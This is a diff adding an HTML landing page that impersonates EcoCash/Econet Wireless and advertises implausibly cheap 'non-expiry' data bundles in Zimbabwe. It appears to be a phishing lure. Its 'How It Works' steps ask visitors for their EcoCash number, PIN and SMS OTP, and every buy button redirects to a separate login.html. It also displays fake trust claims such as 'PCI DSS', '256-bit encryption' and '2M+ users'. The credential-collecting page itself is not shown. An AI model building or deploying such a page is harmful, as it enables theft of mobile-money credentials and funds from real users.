@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#003366">
+    <title>EcoCash Data | Non-Expiry USD Bundles · Zimbabwe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <!-- Tawk.to Script - Properly Placed in Head -->
+    <script type="text/javascript">
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/6a4d1b2d549ffd1d45a159bb/1jsuj4bc7';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+    </script>
+    
+    <style>
+        :root {
+            --blue-dark: #001a33;
+            --blue: #003366;
+            --blue-mid: #004d99;
+            --blue-light: #0077cc;
+            --blue-bright: #00aaff;
+            --red: #e30613;
+            --green: #00a651;
+            --gold: #f5a623;
+            --white: #ffffff;
+            --light: #f0f6ff;
+            --dark: #0d1b2a;
+            --muted: #5a6d80;
+            --border: #d0dce8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+
+        body {
+            font-family: 'Poppins', system-ui, sans-serif;
+            background: var(--white);
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Top Bar */
+        .topbar {
+            background: var(--blue);
+            color: white;
+            padding: 8px 5%;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 11px;
+            font-weight: 500;
+            flex-wrap: wrap;
+        }
+
+        /* Header */
+        header {
+            background: white;
+            padding: 12px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 12px rgba(0,51,102,0.06);
+            border-bottom: 3px solid var(--blue);
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 900;
+            text-decoration: none;
+            letter-spacing: -0.5px;
+        }
+
+        .logo .eco { color: var(--blue); }
+        .logo .cash { color: var(--red); }
+
+        .nav-desktop {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .nav-desktop a {
+            color: var(--dark);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .nav-desktop a:hover { color: var(--blue-light); }
+
+        .nav-cta {
+            background: var(--blue);
+            color: white !important;
+            padding: 10px 22px;
+            border-radius: 50px;
+            font-size: 12px !important;
+            box-shadow: 0 4px 12px rgba(0,51,102,0.25);
+            transition: all 0.2s !important;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .nav-cta:hover { background: var(--blue-light) !important; transform: translateY(-1px); }
+
+        .menu-btn {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 26px;
+            cursor: pointer;
+            color: var(--blue);
+        }
+
+        .mobile-nav {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0; right: 0;
+            background: white;
+            border-bottom: 3px solid var(--blue);
+            box-shadow: 0 8px 20px rgba(0,51,102,0.1);
+            z-index: 999;
+        }
+
+        .mobile-nav.open { display: block; }
+
+        .mobile-nav a {
+            display: block;
+            padding: 14px 5%;
+            color: var(--dark);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .mobile-nav a:hover { background: var(--light); }
+
+        .mobile-nav .m-cta {
+            margin: 12px 5%;
+            text-align: center;
+            background: var(--blue);
+            color: white;
+            padding: 14px;
+            border-radius: 50px;
+            border-bottom: none;
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: 700;
+        }
+
+        /* Hero */
+        .hero {
+            background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 50%, var(--blue-mid) 100%);
+            color: white;
+            padding: 80px 5% 70px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -40%; right: -15%;
+            width: 500px; height: 500px;
+            background: radial-gradient(circle, rgba(0,170,255,0.12) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+
+        .hero-inner { position: relative; z-index: 1; max-width: 680px; margin: 0 auto; }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.2);
+            padding: 8px 18px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 18px;
+        }
+
+        .hero h1 {
+            font-size: 2.8rem;
+            font-weight: 900;
+            margin-bottom: 14px;
+            letter-spacing: -1.5px;
+            line-height: 1.1;
+        }
+
+        .hero h1 .hl { color: var(--blue-bright); }
+
+        .hero p { font-size: 1.05rem; opacity: 0.9; margin-bottom: 28px; }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 28px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+
+        .stat-item { text-align: center; }
+        .stat-item .num { font-size: 1.6rem; font-weight: 900; color: var(--blue-bright); }
+        .stat-item .lbl { font-size: 10px; opacity: 0.7; }
+
+        .hero-btns { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
+
+        .btn-hero-1 {
+            background: var(--blue-bright);
+            color: var(--blue-dark);
+            padding: 15px 32px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 800;
+            font-size: 13px;
+            transition: all 0.2s;
+            box-shadow: 0 4px 16px rgba(0,170,255,0.3);
+            border: none;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .btn-hero-1:hover { background: white; transform: translateY(-2px); }
+
+        .btn-hero-2 {
+            background: transparent;
+            color: white;
+            padding: 15px 32px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 13px;
+            border: 2px solid rgba(255,255,255,0.3);
+            transition: all 0.2s;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        .btn-hero-2:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.5); }
+
+        /* Sections */
+        .s-label { text-align: center; color: var(--blue-light); font-weight: 800; font-size: 11px; text-transform: uppercase; letter-spacing: 0.15em; margin-bottom: 6px; }
+        .s-title { text-align: center; font-size: 2rem; font-weight: 900; margin-bottom: 8px; color: var(--dark); letter-spacing: -0.5px; }
+        .s-sub { text-align: center; color: var(--muted); font-size: 0.9rem; margin-bottom: 36px; max-width: 520px; margin-left: auto; margin-right: auto; }
+
+        /* Mix Builder */
+        .mix-sec { padding: 60px 5%; background: var(--light); }
+
+        .mix-box {
+            max-width: 740px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 18px;
+            padding: 28px;
+            box-shadow: 0 6px 24px rgba(0,51,102,0.08);
+            border: 2px solid var(--blue);
+        }
+
+        .mix-tabs { display: flex; gap: 6px; margin-bottom: 22px; flex-wrap: wrap; justify-content: center; }
+
+        .mix-tab {
+            padding: 9px 16px;
+            border-radius: 50px;
+            border: 2px solid var(--border);
+            background: white;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: var(--dark);
+            font-family: inherit;
+        }
+
+        .mix-tab.active { background: var(--blue); color: white; border-color: var(--blue); }
+        .mix-tab:hover:not(.active) { border-color: var(--blue-light); }
+        .mix-tab .pr { display: block; font-size: 10px; opacity: 0.7; }
+
+        .mix-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
+
+        .mix-item {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 16px 10px;
+            text-align: center;
+            border: 2px solid transparent;
+            transition: border 0.2s;
+        }
+
+        .mix-item:hover { border-color: var(--blue-light); }
+        .mix-item .ic { font-size: 22px; margin-bottom: 4px; }
+        .mix-item .lb { font-size: 9px; color: var(--muted); font-weight: 600; text-transform: uppercase; }
+        .mix-item .vl { font-size: 1.2rem; font-weight: 900; color: var(--blue); margin-top: 2px; }
+
+        .mix-price {
+            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
+            border-radius: 12px;
+            padding: 16px;
+            text-align: center;
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .mix-price .lb { font-size: 10px; opacity: 0.8; }
+        .mix-price .am { font-size: 1.8rem; font-weight: 900; }
+
+        .btn-sub {
+            width: 100%;
+            background: var(--blue);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 13px;
+            cursor: pointer;
+            font-family: inherit;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            box-shadow: 0 4px 12px rgba(0,51,102,0.25);
+            transition: all 0.2s;
+        }
+
+        .btn-sub:hover { background: var(--blue-light); transform: translateY(-1px); }
+
+        /* Bundles */
+        .bundles-sec { padding: 60px 5%; }
+
+        .b-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 16px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .b-card {
+            background: white;
+            border: 2px solid var(--border);
+            border-radius: 14px;
+            padding: 24px 20px;
+            text-align: center;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .b-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--blue); border-radius: 14px 14px 0 0; transform: scaleX(0); transition: transform 0.3s; }
+        .b-card:hover::after { transform: scaleX(1); }
+        .b-card:hover { border-color: var(--blue); box-shadow: 0 8px 28px rgba(0,51,102,0.1); transform: translateY(-3px); }
+
+        .b-card.pop { border-color: var(--blue-light); }
+        .b-card.pop::after { transform: scaleX(1); background: var(--blue-light); }
+
+        .b-badge { display: inline-block; background: var(--blue); color: white; padding: 3px 10px; border-radius: 50px; font-size: 9px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; }
+        .b-badge.hot { background: var(--blue-light); }
+
+        .b-data { font-size: 2.2rem; font-weight: 900; color: var(--blue); margin-bottom: 2px; }
+        .b-price { font-size: 1.1rem; font-weight: 800; color: var(--dark); margin-bottom: 12px; }
+
+        .b-list { list-style: none; text-align: left; margin-bottom: 16px; font-size: 11px; color: var(--muted); }
+        .b-list li { padding: 4px 0; display: flex; align-items: center; gap: 6px; }
+        .b-list li::before { content: "\2713"; color: var(--green); font-weight: 900; }
+
+        .btn-b {
+            width: 100%;
+            background: var(--blue);
+            color: white;
+            border: none;
+            padding: 11px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 11px;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .btn-b:hover { background: var(--blue-light); }
+
+        /* Features */
+        .feat-sec { padding: 60px 5%; background: var(--light); }
+
+        .feat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; max-width: 900px; margin: 0 auto; }
+
+        .feat-card {
+            background: white;
+            padding: 24px 18px;
+            border-radius: 14px;
+            text-align: center;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .feat-card:hover { border-color: var(--blue-light); box-shadow: 0 6px 20px rgba(0,51,102,0.08); }
+
+        .feat-ic { width: 48px; height: 48px; background: var(--blue); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.3rem; }
+        .feat-card h3 { font-size: 0.85rem; font-weight: 800; margin-bottom: 4px; }
+        .feat-card p { color: var(--muted); font-size: 0.78rem; }
+
+        /* How */
+        .how-sec {
+            padding: 60px 5%;
+            background: linear-gradient(135deg, var(--blue-dark), var(--blue));
+            color: white;
+        }
+
+        .how-sec .s-label { color: var(--blue-bright); }
+        .how-sec .s-title { color: white; }
+        .how-sec .s-sub { color: rgba(255,255,255,0.7); }
+
+        .steps { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; max-width: 850px; margin: 0 auto; }
+
+        .step {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 24px 16px;
+            border-radius: 14px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .step:hover { background: rgba(255,255,255,0.1); transform: translateY(-3px); }
+
+        .step-n { width: 38px; height: 38px; background: var(--blue-bright); color: var(--blue-dark); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 15px; margin: 0 auto 10px; }
+        .step h3 { font-size: 0.85rem; font-weight: 800; margin-bottom: 4px; }
+        .step p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+
+        /* Footer */
+        footer { background: #000d1a; color: white; padding: 44px 5% 18px; }
+
+        .ft-grid { max-width: 950px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 28px; margin-bottom: 28px; }
+
+        .ft-brand p { color: rgba(255,255,255,0.45); font-size: 11px; margin-top: 8px; line-height: 1.7; }
+        .ft-col h4 { font-size: 0.75rem; font-weight: 800; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.05em; }
+        .ft-col ul { list-style: none; }
+        .ft-col ul li { margin-bottom: 6px; }
+        .ft-col ul li a { color: rgba(255,255,255,0.45); text-decoration: none; font-size: 11px; transition: color 0.2s; }
+        .ft-col ul li a:hover { color: white; }
+
+        .ft-bottom { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 16px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
+        .ft-bottom p { font-size: 10px; color: rgba(255,255,255,0.35); }
+        .ft-badges { display: flex; gap: 12px; font-size: 10px; color: rgba(255,255,255,0.35); font-weight: 600; }
+
+        @media (max-width: 768px) {
+            .nav-desktop { display: none; }
+            .menu-btn { display: block; }
+            .hero { padding: 50px 5% 45px; }
+            .hero h1 { font-size: 1.9rem; }
+            .s-title { font-size: 1.5rem; }
+            .b-grid { grid-template-columns: 1fr; max-width: 360px; margin: 0 auto; }
+            .steps { grid-template-columns: 1fr 1fr; }
+            .ft-grid { grid-template-columns: 1fr 1fr; }
+            .ft-bottom { flex-direction: column; text-align: center; }
+        }
+
+        @media (max-width: 480px) {
+            .hero h1 { font-size: 1.6rem; }
+            .hero-btns { flex-direction: column; align-items: center; }
+            .steps { grid-template-columns: 1fr; }
+            .mix-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="topbar">
+        <span>🇿🇼 Zimbabwe</span>
+        <span>⚡ Instant Activation</span>
+        <span>🔄 Non-Expiry</span>
+        <span>🔒 Secure</span>
+    </div>
+
+    <header>
+        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
+        <nav class="nav-desktop">
+            <a href="#bundles">Data Plans</a>
+            <a href="#mix">Mix Builder</a>
+            <a href="#how">How It Works</a>
+            <button class="nav-cta" onclick="goLogin('4 GB', '0.60')">Get Started</button>
+        </nav>
+        <button class="menu-btn" onclick="toggleMenu()">☰</button>
+        <div class="mobile-nav" id="mobNav">
+            <a href="index.html">Home</a>
+            <a href="#bundles" onclick="closeMenu()">Data Plans</a>
+            <a href="#how" onclick="closeMenu()">How It Works</a>
+            <button class="m-cta" onclick="goLogin('4 GB', '0.60'); closeMenu();">Get Started</button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-inner">
+            <div class="hero-badge">🇿🇼 Zimbabwe's #1 Data Provider</div>
+            <h1>Non-Expiry <span class="hl">USD Data</span> Bundles</h1>
+            <p>Buy affordable data bundles via EcoCash. Instant activation, never expires, all networks.</p>
+            <div class="hero-stats">
+                <div class="stat-item"><div class="num">2M+</div><div class="lbl">Users</div></div>
+                <div class="stat-item"><div class="num">99.9%</div><div class="lbl">Uptime</div></div>
+                <div class="stat-item"><div class="num">$0.60</div><div class="lbl">From</div></div>
+            </div>
+            <div class="hero-btns">
+                <button class="btn-hero-1" onclick="document.getElementById('bundles').scrollIntoView({behavior:'smooth'})">View Data Plans</button>
+                <button class="btn-hero-2" onclick="goLogin('4 GB', '0.60')">Get Started →</button>
+            </div>
+        </div>
+    </section>
+
+    <section class="mix-sec" id="mix">
+        <div class="s-label">Bundle Builder</div>
+        <h2 class="s-title">Mix Your Bundle</h2>
+        <p class="s-sub">Voice, SMS, and Data in one affordable package.</p>
+        <div class="mix-box">
+            <div class="mix-tabs">
+                <button class="mix-tab active" onclick="pickMix(0)">Daily<span class="pr">$0.60</span></button>
+                <button class="mix-tab" onclick="pickMix(1)">3 Days<span class="pr">$1.40</span></button>
+                <button class="mix-tab" onclick="pickMix(2)">Weekly<span class="pr">$2.80</span></button>
+                <button class="mix-tab" onclick="pickMix(3)">2 Weeks<span class="pr">$5.20</span></button>
+                <button class="mix-tab" onclick="pickMix(4)">Monthly<span class="pr">$9.90</span></button>
+            </div>
+            <div class="mix-grid">
+                <div class="mix-item"><div class="ic">📞</div><div class="lb">Voice</div><div class="vl" id="mV">20 Min</div></div>
+                <div class="mix-item"><div class="ic">💬</div><div class="lb">SMS</div><div class="vl" id="mS">25 SMS</div></div>
+                <div class="mix-item"><div class="ic">🌐</div><div class="lb">Data</div><div class="vl" id="mD">3 GB</div></div>
+            </div>
+            <div class="mix-price"><div class="lb">Your bundle price</div><div class="am" id="mP">USD 0.60</div></div>
+            <button class="btn-sub" id="mBtn" onclick="subMix()">Subscribe — Daily</button>
+        </div>
+    </section>
+
+    <section class="bundles-sec" id="bundles">
+        <div class="s-label">USD Pricing</div>
+        <h2 class="s-title">Non-Expiry Data Bundles</h2>
+        <p class="s-sub">Pay via EcoCash. Instant activation. Never expires.</p>
+        <div class="b-grid">
+            <div class="b-card"><div class="b-badge">Starter</div><div class="b-data">4 GB</div><div class="b-price">USD 0.60</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="goLogin('4 GB','0.60')">Get Bundle</button></div>
+            <div class="b-card"><div class="b-badge">Standard</div><div class="b-data">10 GB</div><div class="b-price">USD 1.40</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="goLogin('10 GB','1.40')">Get Bundle</button></div>
+            <div class="b-card"><div class="b-badge">Premium</div><div class="b-data">20 GB</div><div class="b-price">USD 2.80</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="goLogin('20 GB','2.80')">Get Bundle</button></div>
+            <div class="b-card pop"><div class="b-badge hot">Best Value</div><div class="b-data">50 GB</div><div class="b-price">USD 6.50</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li><li>Priority Support</li></ul><button class="btn-b" onclick="goLogin('50 GB','6.50')">Get Bundle</button></div>
+            <div class="b-card"><div class="b-badge">Enterprise</div><div class="b-data">100 GB</div><div class="b-price">USD 12.00</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="goLogin('100 GB','12.00')">Get Bundle</button></div>
+            <div class="b-card"><div class="b-badge">Ultimate</div><div class="b-data">200 GB</div><div class="b-price">USD 19.80</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="goLogin('200 GB','19.80')">Get Bundle</button></div>
+        </div>
+    </section>
+
+    <section class="feat-sec" id="features">
+        <div class="s-label">Why EcoCash Data</div>
+        <h2 class="s-title">Why Choose Us?</h2>
+        <p class="s-sub">Trusted by millions across Zimbabwe.</p>
+        <div class="feat-grid">
+            <div class="feat-card"><div class="feat-ic">🔄</div><h3>Never Expires</h3><p>Your data stays valid forever.</p></div>
+            <div class="feat-card"><div class="feat-ic">⚡</div><h3>Instant Activation</h3><p>Buy and browse immediately.</p></div>
+            <div class="feat-card"><div class="feat-ic">💾</div><h3>Auto Rollover</h3><p>Unused data carries forward.</p></div>
+            <div class="feat-card"><div class="feat-ic">🔒</div><h3>Bank-Level Security</h3><p>256-bit encryption on all transactions.</p></div>
+        </div>
+    </section>
+
+    <section class="how-sec" id="how">
+        <div class="s-label">EcoCash Payment</div>
+        <h2 class="s-title">How It Works</h2>
+        <p class="s-sub">Simple 4-step EcoCash process.</p>
+        <div class="steps">
+            <div class="step"><div class="step-n">1</div><h3>Select Bundle</h3><p>Choose your preferred data bundle.</p></div>
+            <div class="step"><div class="step-n">2</div><h3>Enter Details</h3><p>Provide EcoCash number and PIN.</p></div>
+            <div class="step"><div class="step-n">3</div><h3>Verify OTP</h3><p>Enter the 6-digit SMS code.</p></div>
+            <div class="step"><div class="step-n">4</div><h3>Enjoy Data</h3><p>Bundle activates instantly!</p></div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="ft-grid">
+            <div class="ft-brand">
+                <span class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></span>
+                <p>Zimbabwe's leading mobile money platform. Buy non-expiry data bundles securely.</p>
+            </div>
+            <div class="ft-col"><h4>Products</h4><ul><li><a href="#bundles">Data Bundles</a></li><li><a href="#mix">Mix Builder</a></li><li><a href="#">Airtime</a></li></ul></div>
+            <div class="ft-col"><h4>Support</h4><ul><li><a href="#">Help Centre</a></li><li><a href="#">Contact</a></li><li><a href="#">FAQ</a></li></ul></div>
+            <div class="ft-col"><h4>Legal</h4><ul><li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li></ul></div>
+        </div>
+        <div class="ft-bottom">
+            <p>&copy; 2026 Econet Wireless · EcoCash Zimbabwe</p>
+            <div class="ft-badges"><span>🔒 256-bit Encrypted</span><span>✓ PCI DSS</span></div>
+        </div>
+    </footer>
+
+    <script>
+        function toggleMenu() { document.getElementById('mobNav').classList.toggle('open'); }
+        function closeMenu() { document.getElementById('mobNav').classList.remove('open'); }
+        window.addEventListener('scroll', closeMenu);
+
+        const plans = [
+            { n:'Daily', p:'0.60', v:'20 Min', s:'25 SMS', d:'3 GB' },
+            { n:'3 Days', p:'1.40', v:'40 Min', s:'50 SMS', d:'6 GB' },
+            { n:'Weekly', p:'2.80', v:'80 Min', s:'100 SMS', d:'12 GB' },
+            { n:'2 Weeks', p:'5.20', v:'150 Min', s:'200 SMS', d:'25 GB' },
+            { n:'Monthly', p:'9.90', v:'300 Min', s:'400 SMS', d:'50 GB' }
+        ];
+        let cur = 0;
+
+        function pickMix(i) {
+            cur = i;
+            document.querySelectorAll('.mix-tab').forEach((t,j) => t.classList.toggle('active', j===i));
+            document.getElementById('mV').textContent = plans[i].v;
+            document.getElementById('mS').textContent = plans[i].s;
+            document.getElementById('mD').textContent = plans[i].d;
+            document.getElementById('mP').textContent = 'USD ' + plans[i].p;
+            document.getElementById('mBtn').textContent = 'Subscribe — ' + plans[i].n;
+        }
+
+        function subMix() {
+            const p = plans[cur];
+            const b = `${p.d} + ${p.v} + ${p.s} (${p.n})`;
+            goLogin(b, p.p);
+        }
+
+        function goLogin(data, price) {
+            window.location.href = `login.html?data=${encodeURIComponent(data)}&price=${price}`;
+        }
+    </script>
+</body>
+</html>
